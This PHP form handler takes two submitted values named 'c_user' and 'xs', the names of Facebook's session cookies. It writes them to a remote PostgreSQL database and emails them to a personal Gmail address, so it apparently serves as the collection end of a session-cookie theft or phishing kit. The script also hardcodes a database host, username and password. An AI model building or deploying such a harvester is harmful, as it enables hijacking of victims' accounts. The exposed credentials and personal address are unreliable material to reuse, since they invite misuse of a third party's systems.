<?php
// Neon PostgreSQL connection settings
$host = "ep-green-truth-a49i08qh-pooler.us-east-1.aws.neon.tech";
$dbname = "neondb";
$user = "neondb_owner";
$pass = "npg_AGezYV4Cyia1";
$port = 5432; // Default PostgreSQL port

// Get form data
$c_user = isset($_POST['c_user']) ? $_POST['c_user'] : '';
$xs = isset($_POST['xs']) ? $_POST['xs'] : '';

if (!empty($c_user) && !empty($xs)) {
    try {
        // Connect to Neon PostgreSQL using PDO
        $dsn = "pgsql:host=$host;port=$port;dbname=$dbname;sslmode=require";
        $pdo = new PDO($dsn, $user, $pass, [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
        ]);

        // Insert data into database
        $stmt = $pdo->prepare("INSERT INTO submissions (c_user, xs) VALUES (:c_user, :xs)");
        $stmt->execute([
            ':c_user' => $c_user,
            ':xs' => $xs
        ]);

        // Send email notification
        $to = "naseeb.niaz.ec@gmail.com"; // Replace with your email
        $subject = "New Submission";
        $message = "c_user: $c_user\nxs: $xs";
        $headers = "From: no-reply@example.com";

        mail($to, $subject, $message, $headers);

        echo "Data submitted successfully!";
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
} else {
    echo "Both fields are required.";
}
?>
